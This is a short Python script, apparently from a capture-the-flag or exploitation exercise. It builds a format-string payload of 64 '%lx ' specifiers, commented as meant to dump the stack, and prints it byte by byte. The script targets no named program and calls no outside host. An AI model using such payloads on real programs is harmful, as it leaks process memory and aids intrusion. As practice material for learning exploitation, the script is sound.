#!/usr/bin/env python3

import struct

# pack a 64 bit to little endian
def p(x): return struct.pack('<Q', x)
def printable(x): return (x >= 0x20 and x <= 0x7e)

# dump the entire stack
payload = b'%lx ' * 64

for p in payload:
    if printable(p):
        print(chr(p), end='')
    else:
        print("\\x%02x" % p, end="")
